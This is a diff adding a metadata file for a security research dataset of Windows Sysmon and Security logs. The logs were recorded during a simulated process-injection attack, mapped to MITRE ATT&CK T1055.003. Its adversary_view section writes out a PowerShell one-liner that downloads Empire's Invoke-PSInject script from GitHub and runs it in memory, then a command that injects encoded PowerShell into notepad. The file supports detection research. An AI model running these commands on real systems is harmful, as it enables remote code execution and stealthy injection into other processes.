@@ -1,0 +1,47 @@
+id: 190518-ProcessInjection-CreateRemoteThread
+title: Process Injection via CreateRemoteThread API
+description: This dataset represents adversaries reflectively loading/intecting a portable executable (PE) (not on disk) into a process via WriteprocessMemory and executed via CreateRemoteThread APIs
+references:
+  - https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/
+  - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+modification_date: 2022/09/22
+platform:
+  - Windows
+type: atomic
+tags:
+  - PE Injection
+  - WriteProcessMemory
+  - CreateRemoteThread
+
+attack_mappings:
+  - technique: T1055
+    sub-technique: "003"
+    tactics:
+      - TA0004
+      - TA0005
+
+datasets:
+  - log_source:
+    size: 1.21 MB
+    link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-ProcessInjection-CreateRemoteThread/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+  - log_source:
+    size: 81.69 kB
+    link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-ProcessInjection-CreateRemoteThread/WORKSTATION6_Windows_Security.zip
+
+simulation:
+  environment: Blacksmith
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script: https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    PS C:\Users\wardog.MSSENTINEL> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-PSInject.ps1')
+    PS C:\Users\wardog.MSSENTINEL> notepad
+    PS C:\Users\wardog.MSSENTINEL> Invoke-PSInject -ProcName notepad -PoshCode 'SW52b2tlLUV4cHJlc3Npb24gd2hvYW1p'
